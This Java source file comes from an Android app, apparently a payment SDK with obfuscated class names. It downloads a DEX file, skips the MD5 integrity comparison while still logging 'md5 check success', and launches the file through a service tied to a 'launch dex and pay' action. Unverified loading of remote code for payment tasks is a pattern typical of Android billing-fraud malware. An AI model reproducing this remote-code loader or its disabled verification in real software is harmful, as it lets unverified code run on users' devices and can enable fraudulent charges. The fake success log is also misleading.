package com.channel.di.net;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.channel.di.entry.DownloadTask;
import com.channel.di.utils.Constants;
import com.channel.di.utils.Util;
import com.channel.ef.Ues;
import com.gandalf.daemon.utils.XL_log;
import com.zhy.http.okhttp.callback.FileCallBack;

import java.io.File;

import k.m.IPayListener;
import k.m.PayTask;
import okhttp3.Call;

public class DownloadDexCallBack extends FileCallBack {
    public String mDestFileDir;
    public String mDestFileName;
    public DownloadTask mDownloadTask;
    public String mPayTaskId;
    private Context mContext;
    private int TRY_AGAIN_TIME = 0;
    private static int TRY_AGAIN_TIME_LIMIT = 6;

    public DownloadDexCallBack(Context context, String destFileDir,
                               String destFileName, DownloadTask downloadTask, String payTaskId) {
        super(destFileDir, destFileName);
        this.mDestFileDir = destFileDir;
        this.mDestFileName = destFileName;
        this.mContext = context;
        this.mDownloadTask = downloadTask;
        this.mPayTaskId = payTaskId;
    }

    private static final XL_log log = new XL_log(DownloadDexCallBack.class);

    @Override
    public void inProgress(float progress, long total, int id) {
        super.inProgress(progress, total, id);
    }

    @Override
    public void onError(Call arg0, Exception exception, int code) {
        if (exception != null) {
            log.error("download download error:"
                    + Log.getStackTraceString(exception));
        } else {
            log.debug("download download onError");
        }
        // try again
        retry();
    }

    @Override
    public void onResponse(File file, int arg1) {
        if (file == null) {
            log.debug("download failed , file not exist");
            retry();
            return;
        }
        String fileMd5 = Util.md5sum(file.getAbsolutePath());
        log.debug("donwload file:" + file.getAbsolutePath() + " finish md5:"
                + fileMd5 + " right md5:" + mDownloadTask.mMd5);
        /*if (!fileMd5.equals(mDownloadTask.mMd5)) {
            log.debug("md5 check failed, local:" + fileMd5 + " server:" + mDownloadTask.mMd5);
            return;
        }*/
        log.debug("md5 check success");
        launchDex(file.getAbsolutePath());
    }

    private void launchDex(String path) {
        Intent intent = new Intent(mContext, Ues.class);
        intent.setAction(Constants.INTENT_ACTION_LAUNCH_DEX_AND_PAY);
        intent.putExtra(Constants.INTENT_BUNDEL_KEY_DEX_PATH, path);
        mContext.startService(intent);
    }

    private void retry() {
        if (TRY_AGAIN_TIME < TRY_AGAIN_TIME_LIMIT) {
            log.debug("cur retry download time :" + TRY_AGAIN_TIME
                    + " download try again");
            TRY_AGAIN_TIME++;
            try {
                Thread.sleep(3 * 1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            DownloadManager.downloadDex(mContext, this);
        } else {
            log.debug("cur retry download time :" + TRY_AGAIN_TIME
                    + " don't try download again ");
            PayTask.notifListener(mPayTaskId, false, IPayListener.ERROR_CODE_NETWORK_ERROR, "ERROR_CODE_NETWORK_ERROR");
        }
    }
}
